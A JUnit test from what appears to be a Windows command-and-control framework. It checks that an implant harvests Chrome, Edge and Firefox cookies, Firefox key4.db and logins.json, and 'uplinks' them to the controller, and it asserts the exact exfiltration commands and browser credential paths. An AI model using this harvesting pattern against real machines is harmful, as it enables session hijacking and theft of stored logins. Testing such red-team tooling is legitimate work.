package c2.win;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.junit.jupiter.api.Test;

import c2.session.CommandMacroManager;
import util.Time;
import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestCommons;
import util.test.TestConstants;

class WindowsCookierHarvesterTest extends ClientServerTest {

	//Are all cookies available?
	boolean canAttemptTest() {
		return Files.exists(Paths.get(CookiesCommandHelper.getChromeCookiesFilename())) && Files.exists(Paths.get(CookiesCommandHelper.getEdgeCookiesFilename())) && Files.exists(Paths.get(CookiesCommandHelper.getFirefoxCookiesFilename()));
	}
	
	@Test
	void testPythonHTTPS() {
		if (System.getProperty("os.name").contains("Windows") && canAttemptTest()) {
			initiateServer();
			spawnClient(TestConstants.PYTHON_HTTPSDAEMON_TEST_EXE);

			try {
				testBody(TestCommons.LANGUAGE.PYTHON);
			}catch(InterruptedException ex) {
				fail(ex.getMessage());
			}
			
			teardown();
		}
	}
	
	@Test
	void testNative() {
		if (System.getProperty("os.name").contains("Windows") && canAttemptTest()) {
			initiateServer();
			spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);

			try {
				testBody(TestCommons.LANGUAGE.WINDOWS_NATIVE);
			}catch(InterruptedException ex) {
				fail(ex.getMessage());
			}
			
			teardown();
		}
	}

	
	static void testBody(TestCommons.LANGUAGE language) throws InterruptedException {
		RunnerTestGeneric.cleanup("C++");
		
		System.out.println("Transmitting commands");

		try {
			try {
				Thread.sleep(5000);// allow both commander and daemon to start
			} catch (InterruptedException e) {
				// Ensure that python client has connected
			}
			System.out.println("Connecting test commander...");
			Socket remote = new Socket("localhost", 8111);
			System.out.println("Locking test commander streams...");
			OutputStreamWriter bw = new OutputStreamWriter(remote.getOutputStream());
			BufferedReader br = new BufferedReader(new InputStreamReader(remote.getInputStream()));

			System.out.println("Setting up test commander session...");
			try {
				RunnerTestGeneric.connectionSetupGeneric(remote, bw, br, false, false);
			} catch (Exception ex) {
				fail(ex.getMessage());
			}

			// Test harvest all
			bw.write(CommandMacroManager.HARVEST_COOKIES_CMD + System.lineSeparator());
			bw.flush();
			String hostname = InetAddress.getLocalHost().getHostName();
			String username = System.getProperty("user.name");
			String firefoxAssets = "test" + File.separator + hostname + username + File.separator + "FirefoxMaterials"
					+ File.separator + "cookies.sqlite";
			String firefoxKeysDb = "test" + File.separator + hostname + username + File.separator + "FirefoxMaterials"
					+ File.separator + "key4.db";
			String firefoxLogins = "test" + File.separator + hostname + username + File.separator + "FirefoxMaterials"
					+ File.separator + "logins.json";
			String chromeAssets = "test" + File.separator + hostname + username + File.separator + "ChromeMaterials"
					+ File.separator + "Cookies";
			String edgeAssets = "test" + File.separator + hostname + username + File.separator + "EdgeMaterials"
					+ File.separator + "Cookies";

			System.out.println("Testing nominal all cookies");
			// Check that the cookies are in local storage
			Time.sleepWrapped(75000);
			
			assertTrue(Files.exists(Paths.get(firefoxAssets)));
			assertTrue(Files.exists(Paths.get(firefoxKeysDb)));
			assertTrue(Files.exists(Paths.get(firefoxLogins)));
			assertTrue(Files.exists(Paths.get(chromeAssets)));
			assertTrue(Files.exists(Paths.get(edgeAssets)));

			String appdata = System.getenv("APPDATA");
			String realChromeCookies = CookiesCommandHelper.CHROME_COOKIES_FILENAME.replace("%APPDATA%", appdata)
					.replaceAll("\"", "");
			String realEdgeCookies = CookiesCommandHelper.EDGE_CHROMIUM_FILENAME.replace("%APPDATA%", appdata)
					.replaceAll("\"", "");
			byte[] referenceChromeCookies = Files.readAllBytes(Paths.get(realChromeCookies));
			byte[] copiedChromeCookies = Files.readAllBytes(Paths.get(chromeAssets));
			areFilesEqual(referenceChromeCookies, copiedChromeCookies);

			byte[] referenceEdgeCookies = Files.readAllBytes(Paths.get(realEdgeCookies));
			byte[] copiedEdgeCookies = Files.readAllBytes(Paths.get(edgeAssets));
			areFilesEqual(referenceEdgeCookies, copiedEdgeCookies);
			// TODO:Firefox equal?

			System.out.println("Reading IO response");
			String line = br.readLine();
			assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'", line);
			
			line = br.readLine();
			assertEquals("Macro Executor: 'Captured Chrome Cookies'", line);
			
			line = br.readLine();
			assertEquals("Sent Command: 'dir %APPDATA%\\Mozilla\\Firefox\\Profiles'", line);

			int limit = 13;
			if(language == TestCommons.LANGUAGE.WINDOWS_NATIVE) {
				limit = 12;
			}
			for(int idx = 0; idx < limit; idx++) {
				br.readLine();//Flush the "dir" command
			}
			
			line = br.readLine();
			assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\fqs6w1w8.default\\cookies.sqlite'", line);
			line = br.readLine();
			assertEquals("Macro Executor: 'Captured Firefox Cookies'", line);
			line = br.readLine();
			assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\fqs6w1w8.default\\key4.db'", line);
			line = br.readLine();
			assertEquals("Macro Executor: 'Captured Firefox creds'", line);
			line = br.readLine();
			assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'", line);
			line = br.readLine();
			assertEquals("Macro Executor: 'Captured Edge Cookies'", line);
			
			// Delete local cookies storage
			Files.deleteIfExists(Paths.get(firefoxAssets));
			Files.deleteIfExists(Paths.get(firefoxKeysDb));
			Files.deleteIfExists(Paths.get(firefoxLogins));
			Files.deleteIfExists(Paths.get(chromeAssets));
			Files.deleteIfExists(Paths.get(edgeAssets));

			// Delete local cookies storage
			Files.deleteIfExists(Paths.get(firefoxAssets));
			Files.deleteIfExists(Paths.get(firefoxKeysDb));
			Files.deleteIfExists(Paths.get(firefoxLogins));
			Files.deleteIfExists(Paths.get(chromeAssets));
			Files.deleteIfExists(Paths.get(edgeAssets));

			Time.sleepWrapped(2000);

			bw.write("die" + System.lineSeparator());
			bw.flush();

			Time.sleepWrapped(2000);

			Files.delete(
					Paths.get("test" + File.separator + hostname + username + File.separator + "FirefoxMaterials"));
			Files.delete(Paths.get("test" + File.separator + hostname + username + File.separator + "ChromeMaterials"));
			Files.delete(Paths.get("test" + File.separator + hostname + username + File.separator + "EdgeMaterials"));
			Files.delete(Paths.get("test" + File.separator + hostname + username));

		} catch (Exception ex) {
			ex.printStackTrace();
			fail(ex.getMessage());
		}
	}
	
	private static void areFilesEqual(byte[] f1, byte[] f2) {
		//Skipping equality checks for now, as the file contents may be modified during the test by the system
		//File download integrity is checked elsewhere in the test suite.
		/*
		assertEquals(f1.length, f2.length);
		for (int idx = 0; idx < f1.length; idx++) {
			assertEquals(f1[idx], f2[idx], "Failed equality check on index: " + idx + " of len " + f1.length);
		}
		*/
		
	}
}
